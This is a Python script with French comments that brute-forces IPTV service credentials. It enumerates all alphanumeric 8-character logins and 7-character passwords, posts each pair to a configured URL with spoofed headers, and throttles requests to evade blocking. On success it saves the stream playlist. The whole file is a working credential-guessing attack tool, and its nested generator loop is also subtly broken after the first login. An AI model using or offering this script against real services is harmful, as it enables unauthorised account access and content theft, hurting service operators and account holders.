import requests
import itertools
import configparser
import time

# Initialisation du fichier de configuration
config = configparser.ConfigParser()
fichier_config = "config.ini"
config.read(fichier_config)

# Récupérer les paramètres
base_url = config.get("iptv", "base_url")
username = config.get("iptv", "username")
password = config.get("iptv", "password")
type_ = config.get("iptv", "type")
output = config.get("iptv", "output")

# Récupérer les headers depuis la configuration
headers = {
    "User-Agent": config.get("header", "User-Agent"),
    "Accept": config.get("header", "Accept"),
    "Connection": config.get("header", "Connection"),
    "Referer": config.get("header", "Referer")
}

# Générer des combinaisons pour login et mot de passe
def generate_combinations(characters, length):
    return ("".join(comb) for comb in itertools.product(characters, repeat=length))

# Vérifier si l'adresse IP est potentiellement bloquée
def is_ip_blocked(response):
    if response.status_code == 403:  # Code HTTP 403: Forbidden
        print("IP bloquée par le serveur. Arrêt du test.")
        return True
    if "Too Many Requests" in response.text:  # Message typique pour les limites
        print("Détection de trop de requêtes. Arrêt du test.")
        return True
    return False

# Fonction principale pour tester les combinaisons
def brute_force_test():
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    login_combinations = generate_combinations(characters, 8)
    password_combinations = generate_combinations(characters, 7)

    for login in login_combinations:
        for password in password_combinations:
            print(f"Testing Login: {login}, Password: {password}")
            try:
                response = requests.post(base_url, headers=headers, data={"login": login, "password": password})

                if is_ip_blocked(response):
                    return

                if response.status_code == 200 and "Content-Type" in response.headers and "application/x-mpegURL" in response.headers["Content-Type"]:
                    print(f"Valid combination found! Login: {login}, Password: {password}")

                    # Télécharger le fichier M3U
                    with open(f"{output}_valid_{login}_{password}.m3u", "wb") as f:
                        f.write(response.content)
                    return
                elif response.status_code != 200:
                    print(f"Invalid combination: {login}, {password} - Status Code: {response.status_code}")

            except requests.exceptions.RequestException as e:
                print(f"Erreur lors de la requête : {e}")
                return

            # Pause pour éviter un blocage potentiel
            time.sleep(0.1)  # Ajustez selon les besoins

if __name__ == "__main__":
    brute_force_test()
